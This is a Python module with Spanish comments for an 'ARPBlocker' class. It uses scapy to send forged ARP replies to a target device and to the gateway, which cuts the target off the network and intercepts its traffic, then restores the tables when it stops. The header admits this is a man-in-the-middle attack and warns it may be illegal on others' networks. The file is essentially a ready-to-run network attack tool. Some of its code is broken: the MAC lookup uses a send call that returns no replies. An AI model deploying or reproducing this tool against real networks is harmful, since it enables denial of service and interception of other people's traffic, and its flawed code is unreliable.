"""
ARPBlocker - Bloqueo de dispositivos vía ARP spoofing
Author: Héctor Alejandro Pérez (@halexespejo-cmd)

ADVERTENCIA: ARP spoofing es técnicamente un ataque MITM.
- Solo usar en redes propias
- Requiere permisos root/sudo
- Puede ser ilegal en redes ajenas
"""
import asyncio
import logging
import threading
import time
from typing import Dict, Set, Optional
from datetime import datetime

from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf

from src.config import get_settings

logger = logging.getLogger(__name__)
settings = get_settings()

# Silenciar warnings de scapy
conf.verb = 0


class ARPBlocker:
    """
    Bloquea dispositivos mediante ARP spoofing
    
    Funcionamiento:
    1. Envía paquetes ARP falsos al dispositivo target
    2. Le dice que el gateway está en nuestra MAC (spoofing)
    3. Envía paquetes ARP falsos al gateway
    4. Le dice que el target está en nuestra MAC
    5. Resultado: tráfico interceptado, dispositivo sin internet
    """
    
    def __init__(self, interface: str = None):
        self.interface = interface or settings.NETWORK_INTERFACE
        self.gateway_ip: Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self.my_mac: Optional[str] = None
        
        # Dispositivos bloqueados activos
        self.blocked_devices: Dict[str, Dict] = {}  # {mac: {ip, thread, active}}
        
        # Threading
        self._threads: Dict[str, threading.Thread] = {}
        self._stop_flags: Dict[str, threading.Event] = {}
        self._lock = threading.Lock()
        
        # Estado
        self.is_initialized = False
        
    async def initialize(self, gateway_ip: str, gateway_mac: str = None):
        """
        Inicializa el blocker con info de red
        
        Args:
            gateway_ip: IP del gateway/router
            gateway_mac: MAC del gateway (auto-detect si None)
        """
        try:
            self.gateway_ip = gateway_ip
            
            # Obtener mi MAC
            try:
                self.my_mac = get_if_hwaddr(self.interface)
            except:
                # Fallback: usar MAC genérica o primera interfaz
                try:
                    self.my_mac = get_if_hwaddr(conf.iface)
                except:
                    logger.warning("Could not get MAC address, using fallback")
                    self.my_mac = "00:00:00:00:00:00"
            
            # Obtener MAC del gateway si no se proporciona
            if gateway_mac is None:
                gateway_mac = await self._get_mac(gateway_ip)
            
            self.gateway_mac = gateway_mac
            
            self.is_initialized = True
            logger.info(
                f"ARPBlocker initialized: gateway={gateway_ip} ({gateway_mac}), "
                f"interface={self.interface}, my_mac={self.my_mac}"
            )
            
        except Exception as e:
            logger.error(f"Failed to initialize ARPBlocker: {e}")
            self.is_initialized = False
            raise
    
    async def _get_mac(self, ip: str) -> Optional[str]:
        """
        Obtiene MAC address de una IP vía ARP request
        
        Args:
            ip: IP address
        
        Returns:
            MAC address o None
        """
        try:
            # ARP request
            arp = ARP(pdst=ip)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp
            
            # Enviar y esperar respuesta
            result = await asyncio.to_thread(
                lambda: sendp(packet, timeout=2, verbose=0, iface=self.interface)
            )
            
            if result and len(result) > 0:
                return result[0][1].hwsrc
            
            return None
            
        except Exception as e:
            logger.error(f"Error getting MAC for {ip}: {e}")
            return None
    
    def _spoof_thread(self, target_ip: str, target_mac: str, stop_event: threading.Event):
        """
        Thread que envía paquetes ARP spoofing continuamente
        
        Args:
            target_ip: IP del dispositivo a bloquear
            target_mac: MAC del dispositivo
            stop_event: Event para detener el thread
        """
        logger.info(f"ARP spoofing thread started for {target_ip} ({target_mac})")
        
        interval = settings.ARP_INTERVAL  # Segundos entre paquetes
        
        while not stop_event.is_set():
            try:
                # Paquete 1: Decirle al target que somos el gateway
                arp_to_target = ARP(
                    op=2,  # ARP reply
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.my_mac
                )
                
                # Paquete 2: Decirle al gateway que somos el target
                arp_to_gateway = ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=target_ip,
                    hwsrc=self.my_mac
                )
                
                # Enviar ambos paquetes
                sendp(Ether(dst=target_mac) / arp_to_target, verbose=0, iface=self.interface)
                sendp(Ether(dst=self.gateway_mac) / arp_to_gateway, verbose=0, iface=self.interface)
                
                # Esperar intervalo o hasta stop
                stop_event.wait(interval)
                
            except Exception as e:
                logger.error(f"Error in spoof thread for {target_ip}: {e}")
                time.sleep(interval)
        
        # Restaurar ARP al detener
        self._restore_arp(target_ip, target_mac)
        logger.info(f"ARP spoofing thread stopped for {target_ip}")
    
    def _restore_arp(self, target_ip: str, target_mac: str):
        """
        Restaura las tablas ARP correctas
        
        Args:
            target_ip: IP del dispositivo
            target_mac: MAC del dispositivo
        """
        try:
            # Decirle al target la MAC real del gateway
            arp_restore_target = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac
            )
            
            # Decirle al gateway la MAC real del target
            arp_restore_gateway = ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=target_ip,
                hwsrc=target_mac
            )
            
            # Enviar varias veces para asegurar
            for _ in range(3):
                sendp(Ether(dst=target_mac) / arp_restore_target, verbose=0, iface=self.interface)
                sendp(Ether(dst=self.gateway_mac) / arp_restore_gateway, verbose=0, iface=self.interface)
                time.sleep(0.5)
            
            logger.info(f"ARP restored for {target_ip}")
            
        except Exception as e:
            logger.error(f"Error restoring ARP for {target_ip}: {e}")
    
    async def block_device(self, ip: str, mac: str) -> bool:
        """
        Bloquea un dispositivo iniciando ARP spoofing
        
        Args:
            ip: IP del dispositivo
            mac: MAC address del dispositivo
        
        Returns:
            True si bloqueado exitosamente
        """
        if not self.is_initialized:
            logger.error("ARPBlocker not initialized")
            return False
        
        mac = mac.upper()
        
        with self._lock:
            # Si ya está bloqueado, no hacer nada
            if mac in self.blocked_devices:
                logger.warning(f"Device {mac} already blocked")
                return True
            
            # Crear stop event
            stop_event = threading.Event()
            self._stop_flags[mac] = stop_event
            
            # Crear y arrancar thread
            thread = threading.Thread(
                target=self._spoof_thread,
                args=(ip, mac, stop_event),
                daemon=True,
                name=f"arp-spoof-{mac}"
            )
            thread.start()
            
            self._threads[mac] = thread
            self.blocked_devices[mac] = {
                'ip': ip,
                'thread': thread,
                'active': True,
                'blocked_at': datetime.utcnow()
            }
            
            logger.info(f"Device {mac} ({ip}) blocked via ARP spoofing")
            return True
    
    async def unblock_device(self, mac: str) -> bool:
        """
        Desbloquea un dispositivo deteniendo ARP spoofing
        
        Args:
            mac: MAC address del dispositivo
        
        Returns:
            True si desbloqueado exitosamente
        """
        mac = mac.upper()
        
        with self._lock:
            if mac not in self.blocked_devices:
                logger.warning(f"Device {mac} not blocked")
                return True
            
            # Señal de stop
            if mac in self._stop_flags:
                self._stop_flags[mac].set()
            
            # Esperar thread
            if mac in self._threads:
                thread = self._threads[mac]
                # No usar join() dentro del lock, hacerlo fuera
                
            # Limpiar estructuras
            device_info = self.blocked_devices.pop(mac, None)
            self._stop_flags.pop(mac, None)
            self._threads.pop(mac, None)
            
            logger.info(f"Device {mac} unblocked")
            return True
    
    async def stop_all(self):
        """
        Detiene todos los bloqueos activos
        """
        logger.info("Stopping all ARP spoofing threads...")
        
        with self._lock:
            macs = list(self.blocked_devices.keys())
        
        # Desbloquear todos
        for mac in macs:
            await self.unblock_device(mac)
        
        logger.info("All devices unblocked")
    
    def get_blocked_devices(self) -> Dict[str, Dict]:
        """
        Lista de dispositivos bloqueados actualmente
        
        Returns:
            Dict {mac: {ip, active, blocked_at}}
        """
        with self._lock:
            return {
                mac: {
                    'ip': info['ip'],
                    'active': info['active'],
                    'blocked_at': info['blocked_at'].isoformat()
                }
                for mac, info in self.blocked_devices.items()
            }


# Singleton global
_blocker_instance: Optional[ARPBlocker] = None


def get_arp_blocker() -> ARPBlocker:
    """
    Obtiene la instancia global del ARPBlocker
    
    Returns:
        Instancia de ARPBlocker
    """
    global _blocker_instance
    
    if _blocker_instance is None:
        _blocker_instance = ARPBlocker()
    
    return _blocker_instance
